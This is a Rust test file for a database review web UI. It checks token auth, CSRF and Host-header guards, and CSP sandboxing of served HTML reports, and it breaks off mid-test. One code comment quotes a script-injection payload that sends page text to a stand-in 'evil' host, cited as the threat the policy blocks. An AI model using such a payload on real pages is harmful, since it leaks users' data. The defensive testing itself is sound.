//! Review-UI API tests: drive the axum router directly against a temp
//! database — overview triage payload, plan approve/reject flow, read-only
//! gating, version diff, and the SQL scratchpad.

use std::sync::Arc;

use arrow::array::{
    ArrayRef, Float64Array, Int64Array, RecordBatch, StringArray, TimestampNanosecondArray,
};
use arrow::datatypes::{DataType, Field, Schema, SchemaRef, TimeUnit};
use axum::body::Body;
use axum::http::{Request, StatusCode};
use h5i_db_core::{Database, StorageOptions, TableOptions, WriteOptions};
use h5i_db_ui::{UiState, build_router};
use http_body_util::BodyExt;
use tower::util::ServiceExt;

fn schema() -> SchemaRef {
    Arc::new(Schema::new(vec![
        Field::new(
            "ts",
            DataType::Timestamp(TimeUnit::Nanosecond, Some("UTC".into())),
            false,
        ),
        Field::new("symbol", DataType::Utf8, false),
        Field::new("price", DataType::Float64, false),
        Field::new("size", DataType::Int64, false),
    ]))
}

fn batch(ts: &[i64], price: f64) -> RecordBatch {
    let syms: Vec<&str> = ts.iter().map(|_| "A").collect();
    let prices: Vec<f64> = ts.iter().map(|_| price).collect();
    let sizes: Vec<i64> = ts.iter().map(|_| 1).collect();
    RecordBatch::try_new(
        schema(),
        vec![
            Arc::new(TimestampNanosecondArray::from(ts.to_vec()).with_timezone("UTC".to_string())),
            Arc::new(StringArray::from(syms)),
            Arc::new(Float64Array::from(prices)),
            Arc::new(Int64Array::from(sizes)),
        ],
    )
    .unwrap()
}

const TEST_TOKEN: &str = "test-token";

/// Router with a fixed token so the helpers can authenticate.
fn router_for(db: &Arc<Database>, allow_mutations: bool) -> axum::Router {
    let mut state = UiState::new(db.clone(), "test.db".into(), allow_mutations);
    state.token = TEST_TOKEN.into();
    build_router(state)
}

async fn setup(allow_mutations: bool) -> (tempfile::TempDir, axum::Router, Arc<Database>) {
    let dir = tempfile::tempdir().unwrap();
    let db = Arc::new(Database::create(&dir.path().join("db")).await.unwrap());
    db.create_table(
        "trades",
        schema(),
        TableOptions {
            time_column: Some("ts".into()),
            sort_key: vec![],
            storage: StorageOptions {
                target_segment_bytes: 8 * 1024,
                target_row_group_bytes: 4 * 1024,
                ..Default::default()
            },
            max_segments_per_manifest: None,
        },
    )
    .await
    .unwrap();
    let ts: Vec<i64> = (0..500).collect();
    db.write("trades", vec![batch(&ts, 100.0)], WriteOptions::default())
        .await
        .unwrap();
    let ts2: Vec<i64> = (500..800).collect();
    db.append("trades", vec![batch(&ts2, 101.0)], WriteOptions::default())
        .await
        .unwrap();
    let router = router_for(&db, allow_mutations);
    (dir, router, db)
}

async fn get_json(router: &axum::Router, path: &str) -> (StatusCode, serde_json::Value) {
    let res = router
        .clone()
        .oneshot(
            Request::builder()
                .uri(path)
                .header("host", "127.0.0.1:8000")
                .header("authorization", format!("Bearer {TEST_TOKEN}"))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let status = res.status();
    let bytes = res.into_body().collect().await.unwrap().to_bytes();
    (status, serde_json::from_slice(&bytes).unwrap())
}

async fn post_json(
    router: &axum::Router,
    path: &str,
    body: Option<serde_json::Value>,
) -> (StatusCode, serde_json::Value) {
    let req = Request::builder()
        .method("POST")
        .uri(path)
        .header("content-type", "application/json")
        .header("host", "127.0.0.1:8000")
        .header("authorization", format!("Bearer {TEST_TOKEN}"))
        .header("x-h5i-csrf", "1")
        .body(Body::from(body.map(|b| b.to_string()).unwrap_or_default()))
        .unwrap();
    let res = router.clone().oneshot(req).await.unwrap();
    let status = res.status();
    let bytes = res.into_body().collect().await.unwrap().to_bytes();
    (status, serde_json::from_slice(&bytes).unwrap())
}

#[tokio::test]
async fn overview_and_table_endpoints() {
    let (_dir, router, _db) = setup(false).await;
    let (status, ov) = get_json(&router, "/api/overview").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(ov["allow_mutations"], false);
    assert_eq!(ov["tables"][0]["name"], "trades");
    assert_eq!(ov["tables"][0]["rows"], 800);
    assert_eq!(ov["plans"].as_array().unwrap().len(), 0);

    let (status, detail) = get_json(&router, "/api/table/trades").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(detail["head"], 2);
    assert_eq!(detail["versions"].as_array().unwrap().len(), 3);
    assert_eq!(detail["versions"][2]["execution_mode"], "direct");

    let (status, sample) = get_json(&router, "/api/table/trades/sample?rows=7").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(sample["rows"].as_array().unwrap().len(), 7);

    // Unknown table → envelope with a hint, HTTP 400.
    let (status, err) = get_json(&router, "/api/table/nope").await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert_eq!(err["code"], "table_not_found");
    assert!(err["hint"].as_str().unwrap().contains("tables"));
}

#[tokio::test]
async fn version_diff_reports_segment_reuse() {
    let (_dir, router, db) = setup(false).await;
    db.delete_range("trades", 0, 100, WriteOptions::default())
        .await
        .unwrap();
    let (status, diff) = get_json(&router, "/api/table/trades/diff?from=2&to=3").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(diff["rows_delta"], -100);
    assert_eq!(diff["schema_changed"], false);
    assert!(diff["segments"]["kept"].as_u64().unwrap() >= 1);
    assert!(!diff["segments"]["removed"].as_array().unwrap().is_empty());
}

#[tokio::test]
async fn plan_flow_via_ui_respects_read_only_and_applies() {
    let (_dir, ro_router, db) = setup(false).await;
    let plan = db
        .plan_replace_range("trades", 0, 100, vec![], WriteOptions::default())
        .await
        .unwrap();

    // Plans surface in the overview with staleness info.
    let (_, ov) = get_json(&ro_router, "/api/overview").await;
    assert_eq!(ov["plans"].as_array().unwrap().len(), 1);
    assert_eq!(ov["plans"][0]["stale"], false);

    // Detail decodes samples.
    let (status, detail) =
        get_json(&ro_router, &format!("/api/plan/trades/{}", plan.plan_id)).await;
    assert_eq!(status, StatusCode::OK);
    assert!(
        !detail["before_sample"]["rows"]
            .as_array()
            .unwrap()
            .is_empty()
    );

    // Read-only UI refuses to apply.
    let (status, err) = post_json(
        &ro_router,
        &format!("/api/plan/trades/{}/apply", plan.plan_id),
        None,
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert_eq!(err["code"], "read_only");

    // A mutations-enabled UI applies it.
    let rw_router = router_for(&db, true);
    let (status, applied) = post_json(
        &rw_router,
        &format!("/api/plan/trades/{}/apply", plan.plan_id),
        None,
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{applied}");
    assert_eq!(applied["sequence"], 3);
    assert_eq!(applied["op"], "delete_range");

    // Applying again (plan consumed) fails cleanly.
    let (status, err) = post_json(
        &rw_router,
        &format!("/api/plan/trades/{}/apply", plan.plan_id),
        None,
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert_eq!(err["code"], "invalid_input");
}

#[tokio::test]
async fn stale_plan_conflicts_with_409() {
    let (_dir, _router, db) = setup(false).await;
    let plan = db
        .plan_replace_range("trades", 0, 100, vec![], WriteOptions::default())
        .await
        .unwrap();
    // Head moves.
    db.append("trades", vec![batch(&[5000], 1.0)], WriteOptions::default())
        .await
        .unwrap();
    let rw_router = router_for(&db, true);
    // The overview marks it stale…
    let (_, ov) = get_json(&rw_router, "/api/overview").await;
    assert_eq!(ov["plans"][0]["stale"], true);
    // …and apply is a 409 conflict, not a silent re-plan.
    let (status, err) = post_json(
        &rw_router,
        &format!("/api/plan/trades/{}/apply", plan.plan_id),
        None,
    )
    .await;
    assert_eq!(status, StatusCode::CONFLICT);
    assert_eq!(err["code"], "version_conflict");
    assert_eq!(err["retryable"], true);
}

#[tokio::test]
async fn sql_scratchpad_returns_rows_and_metrics() {
    let (_dir, router, _db) = setup(false).await;
    let (status, out) = post_json(
        &router,
        "/api/query",
        Some(serde_json::json!({
            "sql": "SELECT symbol, count(*) AS n FROM trades GROUP BY symbol"
        })),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(out["rows"][0][1], 800);
    assert_eq!(out["truncated"], false);
    assert!(out["wall_ms"].as_f64().unwrap() > 0.0);
    assert!(!out["scan_metrics"].as_array().unwrap().is_empty());

    // SQL errors map to the envelope.
    let (status, err) = post_json(
        &router,
        "/api/query",
        Some(serde_json::json!({"sql": "SELECT nope FROM nowhere"})),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert_eq!(err["code"], "invalid_input");
}

#[tokio::test]
async fn index_serves_embedded_html() {
    let (_dir, router, _db) = setup(false).await;
    // The index page needs no token — only a loopback Host.
    let res = router
        .clone()
        .oneshot(
            Request::builder()
                .uri("/")
                .header("host", "localhost:7777")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    let bytes = res.into_body().collect().await.unwrap().to_bytes();
    let html = String::from_utf8_lossy(&bytes);
    assert!(html.contains("h5i-db review"));
    assert!(html.contains("Apply plan"));
    assert!(html.contains("[\"experiments\",\"experiments\"]"));
    assert!(html.contains("function trialAttention"));
    assert!(html.contains("detail-open is the seen edge"));
}

async fn raw_status(router: &axum::Router, req: Request<Body>) -> (StatusCode, serde_json::Value) {
    let res = router.clone().oneshot(req).await.unwrap();
    let status = res.status();
    let bytes = res.into_body().collect().await.unwrap().to_bytes();
    let body = serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null);
    (status, body)
}

#[tokio::test]
async fn guard_rejects_foreign_hosts_missing_tokens_and_csrf() {
    let (_dir, router, _db) = setup(false).await;

    // No token → 401 with the standard envelope.
    let (status, err) = raw_status(
        &router,
        Request::builder()
            .uri("/api/overview")
            .header("host", "127.0.0.1:8000")
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    assert_eq!(err["code"], "unauthorized");
    assert_eq!(err["retryable"], false);

    // Wrong token → 401.
    let (status, _) = raw_status(
        &router,
        Request::builder()
            .uri("/api/overview")
            .header("host", "127.0.0.1:8000")
            .header("authorization", "Bearer wrong")
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    // Foreign Host (DNS rebinding) → 403 even with the right token.
    let (status, err) = raw_status(
        &router,
        Request::builder()
            .uri("/api/overview")
            .header("host", "evil.example:80")
            .header("authorization", format!("Bearer {TEST_TOKEN}"))
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    assert_eq!(err["code"], "forbidden_host");

    // Missing Host header → 403.
    let (status, _) = raw_status(
        &router,
        Request::builder()
            .uri("/api/overview")
            .header("authorization", format!("Bearer {TEST_TOKEN}"))
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    // POST without the CSRF header → 403, even authenticated.
    let (status, err) = raw_status(
        &router,
        Request::builder()
            .method("POST")
            .uri("/api/query")
            .header("host", "127.0.0.1:8000")
            .header("authorization", format!("Bearer {TEST_TOKEN}"))
            .header("content-type", "application/json")
            .body(Body::from(r#"{"sql":"SELECT 1"}"#))
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    assert_eq!(err["code"], "csrf_required");

    // Foreign Host on the index page → 403 too.
    let (status, _) = raw_status(
        &router,
        Request::builder()
            .uri("/")
            .header("host", "evil.example")
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    // Bracketed IPv6 loopback with a port is accepted.
    let (status, _) = raw_status(
        &router,
        Request::builder()
            .uri("/api/overview")
            .header("host", "[::1]:9000")
            .header("authorization", format!("Bearer {TEST_TOKEN}"))
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
}

#[tokio::test]
async fn scratchpad_query_times_out_with_envelope() {
    let (_dir, _router, db) = setup(false).await;
    let mut state = UiState::new(db.clone(), "test.db".into(), false);
    state.token = TEST_TOKEN.into();
    // Force the timeout path deterministically; wall-clock races against a
    // small cross join are inherently runner-speed dependent.
    state.query_timeout = std::time::Duration::from_millis(1);
    state.query_start_delay = std::time::Duration::from_millis(10);
    let router = build_router(state);
    let (status, err) = post_json(
        &router,
        "/api/query",
        Some(serde_json::json!({
            // Force an asynchronous Parquet read; metadata-only COUNT(*) can
            // complete in the timeout future's first poll.
            "sql": "SELECT * FROM trades"
        })),
    )
    .await;
    assert_eq!(status, StatusCode::REQUEST_TIMEOUT);
    assert_eq!(err["code"], "query_timeout");
    assert_eq!(err["retryable"], false);
    assert!(err["hint"].as_str().unwrap().contains("CLI"));
}

#[tokio::test]
async fn scratchpad_disambiguates_duplicate_columns_and_flags_truncation() {
    let (_dir, router, _db) = setup(false).await;
    // Self-join: both sides expose a column whose output name is `price`.
    let (status, out) = post_json(
        &router,
        "/api/query",
        Some(serde_json::json!({
            "sql": "SELECT a.price, b.price FROM trades a JOIN trades b ON a.ts = b.ts LIMIT 3"
        })),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{out}");
    assert_eq!(out["schema"][0]["name"], "price");
    assert_eq!(out["schema"][1]["name"], "price_1");
    let r0 = out["rows"][0].as_array().unwrap();
    assert!(r0[0].is_number());
    assert_eq!(r0[0], r0[1], "second column must not collapse to null");
    assert_eq!(out["truncated"], false);

    // 640 000-row cross join hits the 1 000-row cap and says so.
    let (status, out) = post_json(
        &router,
        "/api/query",
        Some(serde_json::json!({
            "sql": "SELECT a.symbol FROM trades a CROSS JOIN trades b"
        })),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{out}");
    assert_eq!(out["rows"].as_array().unwrap().len(), 1000);
    assert_eq!(out["truncated"], true);
}

// ---------------------------------------------------------------------------
// fork monitor
// ---------------------------------------------------------------------------

/// Build the fork shape the monitor exists for: a fork with its own work, a
/// nested fork inside it, and a base that moved underneath the shadow.
async fn setup_forked() -> (tempfile::TempDir, axum::Router, Arc<Database>) {
    let (dir, _router, db) = setup(false).await;
    db.create_fork(
        "exp-a",
        Some("hypothesis A".into()),
        None,
        serde_json::Map::new(),
    )
    .await
    .unwrap();
    let fork_db = db.open_fork("exp-a").await.unwrap();
    fork_db
        .append(
            "trades",
            vec![batch(&[900, 901], 102.0)],
            WriteOptions::default(),
        )
        .await
        .unwrap();
    fork_db
        .create_fork("exp-a-child", None, None, serde_json::Map::new())
        .await
        .unwrap();
    // Move the base so exp-a's shadow is stale: promote would CAS-fail.
    db.append(
        "trades",
        vec![batch(&[950], 103.0)],
        WriteOptions::default(),
    )
    .await
    .unwrap();
    let router = router_for(&db, false);
    (dir, router, db)
}

#[tokio::test]
async fn forks_endpoint_reports_lineage_and_liveness() {
    let (_dir, router, _db) = setup_forked().await;
    let (status, body) = get_json(&router, "/api/forks").await;
    assert_eq!(status, StatusCode::OK);
    let forks = body["forks"].as_array().unwrap();
    assert_eq!(forks.len(), 2);

    let a = forks.iter().find(|f| f["name"] == "exp-a").unwrap();
    assert!(a["parent"].is_null());
    assert_eq!(a["depth"], 0);
    assert_eq!(a["tables_shadowed"], 1);
    assert_eq!(a["tables_created"], 0);
    assert_eq!(a["stale_shadows"], 1, "base moved past the shadow");
    assert!(a["commits_own"].as_u64().unwrap() >= 1);
    assert!(a["last_write_ns"].as_i64().unwrap() > 0);
    assert_eq!(a["note"], "hypothesis A");

    let c = forks.iter().find(|f| f["name"] == "exp-a-child").unwrap();
    assert_eq!(c["parent"], "exp-a");
    assert_eq!(c["depth"], 1);
    assert_eq!(c["stale_shadows"], 0);
    assert!(c["last_write_ns"].is_null(), "never wrote");

    // The overview carries the same projection so the page boots complete.
    let (_, ov) = get_json(&router, "/api/overview").await;
    assert_eq!(ov["forks"].as_array().unwrap().len(), 2);
    assert!(ov["fork"].is_null(), "base-scoped server");
}

#[tokio::test]
async fn fork_detail_reports_divergence_and_pins() {
    let (_dir, router, _db) = setup_forked().await;
    let (status, d) = get_json(&router, "/api/fork/exp-a").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(d["info"]["name"], "exp-a");
    let pins = d["info"]["pins"].as_object().unwrap();
    assert_eq!(pins.len(), 1);
    let tables = d["diff"]["tables"].as_array().unwrap();
    assert_eq!(tables.len(), 1);
    assert_eq!(tables[0]["table"], "trades");
    assert_eq!(tables[0]["kind"], "shadowed");
    assert_eq!(tables[0]["base_moved"], true);
    assert!(tables[0]["fork_versions"].as_u64().unwrap() >= 1);

    // Unknown fork → error envelope, not a panic.
    let (status, e) = get_json(&router, "/api/fork/no-such-fork").await;
    assert_ne!(status, StatusCode::OK);
    assert!(e["code"].is_string());
}

#[tokio::test]
async fn events_stream_sends_initial_frame() {
    use futures::StreamExt;
    let (_dir, router, _db) = setup_forked().await;
    let res = router
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/events")
                .header("host", "127.0.0.1:8000")
                .header("authorization", format!("Bearer {TEST_TOKEN}"))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    assert!(
        res.headers()
            .get("content-type")
            .unwrap()
            .to_str()
            .unwrap()
            .starts_with("text/event-stream")
    );
    // The first frame is pushed immediately; collect chunks until one full
    // SSE event has arrived.
    let mut stream = res.into_body().into_data_stream();
    let mut text = String::new();
    let deadline = std::time::Duration::from_secs(10);
    while !text.contains("\n\n") {
        let chunk = tokio::time::timeout(deadline, stream.next())
            .await
            .expect("first SSE frame within 10s")
            .expect("stream ended before a frame")
            .unwrap();
        text.push_str(&String::from_utf8_lossy(&chunk));
    }
    assert!(text.contains("event: update"), "got: {text}");
    assert!(text.contains("\"forks\""), "frame carries forks: {text}");
    assert!(text.contains("exp-a"), "frame names the fork: {text}");
}

// ---------------------------------------------------------------------------
// reports
// ---------------------------------------------------------------------------

/// A router whose reports directory holds the given files.
fn router_with_reports(
    db: &Arc<Database>,
    dir: &std::path::Path,
    files: &[(&str, &str)],
) -> axum::Router {
    let reports = dir.join("reports");
    std::fs::create_dir_all(&reports).unwrap();
    for (name, body) in files {
        std::fs::write(reports.join(name), body).unwrap();
    }
    let mut state = UiState::new(db.clone(), "test.db".into(), false).with_reports_dir(reports);
    state.token = TEST_TOKEN.into();
    build_router(state)
}

async fn get_html(router: &axum::Router, path: &str) -> (StatusCode, String) {
    let res = router
        .clone()
        .oneshot(
            Request::builder()
                .uri(path)
                .header("host", "localhost:7777")
                .header("authorization", format!("Bearer {TEST_TOKEN}"))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let status = res.status();
    let bytes = res.into_body().collect().await.unwrap().to_bytes();
    (status, String::from_utf8_lossy(&bytes).to_string())
}

/// Like [`get_html`] but keeps the headers, for the tests that have to compare
/// what was sent *about* a document with what was sent *inside* it.
async fn get_html_with_headers(
    router: &axum::Router,
    path: &str,
) -> (StatusCode, axum::http::HeaderMap, String) {
    let res = router
        .clone()
        .oneshot(
            Request::builder()
                .uri(path)
                .header("host", "localhost:7777")
                .header("authorization", format!("Bearer {TEST_TOKEN}"))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let status = res.status();
    let headers = res.headers().clone();
    let bytes = res.into_body().collect().await.unwrap().to_bytes();
    (status, headers, String::from_utf8_lossy(&bytes).to_string())
}

/// The `content="…"` of the first `<meta http-equiv="Content-Security-Policy">`
/// in a document, i.e. the policy a parser would actually apply.
fn meta_csp(body: &str) -> Option<&str> {
    const TAG: &str = r#"<meta http-equiv="Content-Security-Policy" content=""#;
    let start = body.find(TAG)? + TAG.len();
    let end = start + body[start..].find('"')?;
    Some(&body[start..end])
}

#[tokio::test]
async fn reports_are_listed_and_served() {
    let (dir, _router, db) = setup(false).await;
    let router = router_with_reports(
        &db,
        dir.path(),
        &[
            ("tearsheet.html", "<!doctype html><p>equity</p>"),
            ("factor.html", "<!doctype html><p>ic</p>"),
        ],
    );

    let (status, json) = get_json(&router, "/api/reports").await;
    assert_eq!(status, StatusCode::OK);
    let names: Vec<&str> = json["reports"]
        .as_array()
        .unwrap()
        .iter()
        .map(|v| v.as_str().unwrap())
        .collect();
    assert_eq!(names, vec!["factor.html", "tearsheet.html"], "sorted");

    let (status, body) = get_html(&router, "/report/tearsheet.html").await;
    assert_eq!(status, StatusCode::OK);
    assert!(body.contains("equity"));

    // The listing page is a shell: it embeds no report content, fetches the
    // names from the guarded API, and shows a report inside a frame that has
    // no `allow-same-origin`, so an injected script in a report cannot reach
    // this origin's sessionStorage (where the access token lives).
    let (status, shell) = get_html(&router, "/reports").await;
    assert_eq!(status, StatusCode::OK);
    assert!(
        !shell.contains("factor.html"),
        "the shell must not server-render the listing"
    );
    assert!(shell.contains("/api/reports"), "listing comes from the API");
    assert!(shell.contains(r#"sandbox="allow-scripts""#), "{shell}");
    assert!(
        !shell.contains("allow-same-origin"),
        "sandboxing a report and then handing back the origin is no sandbox"
    );
    assert!(
        shell.contains("srcdoc"),
        "report HTML is never a document here"
    );
}

/// A report is the output of somebody's strategy and its content is shaped by
/// vendor market names, strategy names and config JSON. It must not be
/// readable by any other process on the box, and the copy that is served must
/// not be able to script the origin that holds the access token.
#[tokio::test]
async fn the_report_route_requires_the_token_and_ships_a_sandboxing_csp() {
    let (dir, _router, db) = setup(false).await;
    let router = router_with_reports(&db, dir.path(), &[("tearsheet.html", "<p>equity</p>")]);

    let fetch_report = |token: Option<&str>| {
        let mut req = Request::builder()
            .uri("/report/tearsheet.html")
            .header("host", "127.0.0.1:8000");
        if let Some(token) = token {
            req = req.header("authorization", format!("Bearer {token}"));
        }
        router.clone().oneshot(req.body(Body::empty()).unwrap())
    };

    for token in [None, Some("wrong")] {
        let res = fetch_report(token).await.unwrap();
        assert_eq!(res.status(), StatusCode::UNAUTHORIZED, "token {token:?}");
        let bytes = res.into_body().collect().await.unwrap().to_bytes();
        let body = String::from_utf8_lossy(&bytes).to_string();
        assert!(!body.contains("equity"), "report leaked without a token");
        assert!(body.contains("unauthorized"), "{body}");
    }

    let res = fetch_report(Some(TEST_TOKEN)).await.unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    // The header is the *navigation* copy of the policy and proves only that a
    // direct open of this URL is contained. It says nothing about the path the
    // shell takes; that is `the_report_policy_travels_inside_the_served_document`
    // below, and asserting this header alone was how a control that never ran
    // came to look tested.
    let csp = res
        .headers()
        .get("content-security-policy")
        .expect("reports carry a CSP")
        .to_str()
        .unwrap()
        .to_string();
    assert!(csp.contains("sandbox allow-scripts"), "{csp}");
    assert!(
        !csp.contains("allow-same-origin"),
        "an opaque origin is the whole point: {csp}"
    );
    assert!(csp.contains("default-src 'none'"), "{csp}");

    // The shell itself stays reachable without a token: a browser cannot put
    // an Authorization header on a top-level navigation, and the shell carries
    // no data of its own.
    let res = router
        .clone()
        .oneshot(
            Request::builder()
                .uri("/reports")
                .header("host", "127.0.0.1:8000")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
}

/// A CSP header on the report response is not the control that runs.
///
/// The shell pulls a report with `fetch` and assigns the text to
/// `frame.srcdoc`; a `srcdoc` document takes its policy from its *embedder*,
/// never from the response the text came out of, and the embedder (`/reports`)
/// sends none. So the policy has to be in the bytes, in the head, ahead of the
/// report's own markup, because a meta policy governs only what the parser
/// reads after it. This test asserts the enforceable placement, not the mere
/// existence of a string somewhere in the file.
#[tokio::test]
async fn the_report_policy_travels_inside_the_served_document() {
    let (dir, _router, db) = setup(false).await;
    let router = router_with_reports(
        &db,
        dir.path(),
        &[(
            "tearsheet.html",
            "<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n\
             <title>t</title>\n<style>b{color:red}</style>\n</head>\n\
             <body><p>equity</p><script>draw()</script></body></html>",
        )],
    );
    let (status, body) = get_html(&router, "/report/tearsheet.html").await;
    assert_eq!(status, StatusCode::OK);
    let policy = meta_csp(&body).expect("the served document carries its own policy");

    // Exfiltration is a *send*, and an opaque-origin sandbox only blocks
    // *reads*. Without these an injected market name runs
    // `new Image().src = "https://evil/?" + document.body.innerText` from
    // inside the sandbox and nothing stops it.
    assert!(policy.contains("default-src 'none'"), "{policy}");
    assert!(policy.contains("connect-src 'none'"), "{policy}");
    assert!(policy.contains("img-src data: blob:"), "{policy}");
    assert!(policy.contains("form-action 'none'"), "{policy}");
    assert!(policy.contains("base-uri 'none'"), "{policy}");
    // Reports draw their own charts from inline script and inline style, so
    // both stay; `eval` does not, and no report needs it.
    assert!(policy.contains("script-src 'unsafe-inline'"), "{policy}");
    assert!(policy.contains("style-src 'unsafe-inline'"), "{policy}");
    assert!(!policy.contains("unsafe-eval"), "{policy}");
    // Browsers drop `sandbox` from a meta policy. Writing it here would read
    // like a control and be none, which is the bug this test exists for; the
    // opaque origin comes from the frame's `sandbox="allow-scripts"` attribute.
    assert!(!policy.contains("sandbox"), "{policy}");

    // Placement: inside the head, and ahead of every other thing in it.
    let meta = body.find("http-equiv").unwrap();
    let head = body.find("<head").unwrap();
    assert!(
        head < meta,
        "a meta policy outside the head is ignored: {body}"
    );
    for later in ["charset", "<title>", "<style>", "<script>", "<p>equity"] {
        assert!(
            meta < body.find(later).unwrap(),
            "{later} must be parsed under the policy, not before it: {body}"
        );
    }
    // Never above the doctype: that is quirks mode, and it would reflow every
    // report that renders correctly today.
    assert!(body.starts_with("<!doctype html>"), "{body}");
    // Nothing else about the report changed.
    assert!(body.contains("<p>equity</p>"), "{body}");
    assert!(body.contains("<script>draw()</script>"), "{body}");
}

/// `basket.py` writes `<!doctype html><meta charset=…><title>…` with no
/// explicit `<head>`, so the head-less path is a real shape, not a hypothetical.
/// The policy still has to lead, so the parser hoists it into the head it
/// implies, and it still must not displace the doctype.
#[tokio::test]
async fn a_head_less_report_still_gets_the_policy_first() {
    let (dir, _router, db) = setup(false).await;
    let router = router_with_reports(
        &db,
        dir.path(),
        &[
            (
                "basket.html",
                "<!doctype html><meta charset='utf-8'><title>b</title><h1>b</h1>",
            ),
            ("fragment.html", "<p>equity</p>"),
        ],
    );

    let (_status, body) = get_html(&router, "/report/basket.html").await;
    assert!(
        body.starts_with(r#"<!doctype html><meta http-equiv="Content-Security-Policy""#),
        "{body}"
    );
    assert!(
        meta_csp(&body).unwrap().contains("connect-src 'none'"),
        "{body}"
    );
    // A charset declaration is only honoured inside the first 1 KiB, so the tag
    // pushed in front of it may not be long enough to shove it out.
    assert!(body.find("charset='utf-8'").unwrap() < 1024, "{body}");

    // No doctype to step over: the policy simply leads.
    let (_status, body) = get_html(&router, "/report/fragment.html").await;
    assert!(
        body.starts_with(r#"<meta http-equiv="Content-Security-Policy""#),
        "{body}"
    );
    assert!(body.ends_with("<p>equity</p>"), "{body}");
}

/// Both ways a substring search for `<head` fails open.
///
/// `<head` is a prefix of `<header>`, so a body-level `<header>` in a head-less
/// report would put the policy below the content it exists to constrain; and a
/// `>` inside a quoted attribute would split the start tag, leaving the meta
/// element parsed as attributes of `head` and the policy silently absent. Both
/// end in a report that looks protected and is not, which is the whole shape of
/// the bug being fixed, so neither may be reintroduced by the fix.
#[tokio::test]
async fn the_policy_placement_is_not_fooled_by_header_or_quoted_attributes() {
    let (dir, _router, db) = setup(false).await;
    let router = router_with_reports(
        &db,
        dir.path(),
        &[
            (
                "decoy.html",
                "<!doctype html><body><header>totals</header><p>equity</p></body>",
            ),
            (
                "attrs.html",
                "<!doctype html><html><head data-x=\"a>b\">\
                 <title>t</title></head><body>x</body></html>",
            ),
        ],
    );

    // No head element at all: `<header>` must not be mistaken for one, so the
    // policy leads the document instead.
    let (_status, body) = get_html(&router, "/report/decoy.html").await;
    let meta = body.find("http-equiv").unwrap();
    assert!(
        meta < body.find("<header>").unwrap(),
        "the policy landed below the content it governs: {body}"
    );
    assert!(body.starts_with("<!doctype html><meta "), "{body}");

    // A `>` inside an attribute value does not close the tag.
    let (_status, body) = get_html(&router, "/report/attrs.html").await;
    assert!(
        body.starts_with("<!doctype html><html><head data-x=\"a>b\"><meta "),
        "the meta was swallowed as head attributes: {body}"
    );
    assert!(
        meta_csp(&body).unwrap().contains("connect-src 'none'"),
        "{body}"
    );
}

/// The header copy and the in-document copy are two spellings of one policy.
///
/// They are separate constants only because a `<meta>` policy may not carry
/// `sandbox`. Any other directive present in one and missing from the other is
/// a directive that does not run on the path that matters, which is exactly the
/// failure this pair exists to close.
#[tokio::test]
async fn report_policies_stay_in_step() {
    let (dir, _router, db) = setup(false).await;
    let router = router_with_reports(
        &db,
        dir.path(),
        &[("t.html", "<html><head></head><body>x</body></html>")],
    );
    let (status, headers, body) = get_html_with_headers(&router, "/report/t.html").await;
    assert_eq!(status, StatusCode::OK);
    let header = headers
        .get("content-security-policy")
        .unwrap()
        .to_str()
        .unwrap()
        .to_string();
    let meta = meta_csp(&body).expect("served document carries a policy");

    // Compare directive sets, so whitespace and ordering differences between
    // the two spellings do not read as drift.
    let directives = |policy: &str| -> Vec<String> {
        policy
            .split(';')
            .map(|d| d.split_whitespace().collect::<Vec<_>>().join(" "))
            .filter(|d| !d.is_empty())
            .collect()
    };
    let navigable: Vec<String> = directives(&header)
        .into_iter()
        .filter(|d| !d.starts_with("sandbox"))
        .collect();
    assert_eq!(navigable, directives(meta), "header {header}\nmeta {meta}");
    // The one allowed difference, and `allow-scripts` has to survive in it:
    // the frame attribute sandboxes too, and a document under two sandboxes
    // gets only what both allow, so losing it here kills every chart.
    assert!(header.contains("sandbox allow-scripts"), "{header}");
}

/// The reports feature has to be reachable from the main shell, in a form that
/// carries the token. `sessionStorage` is per tab, so a link without one leaves
/// a new tab with nothing to read, and the startup banner's `/` URL does not
/// fix that tab either.
#[tokio::test]
async fn the_main_shell_links_to_reports_with_the_token() {
    let (_dir, router, _db) = setup(false).await;
    let (status, shell) = get_html(&router, "/").await;
    assert_eq!(status, StatusCode::OK);
    assert!(
        shell.contains(r#"id="reportslink""#),
        "no way in from the UI"
    );
    assert!(
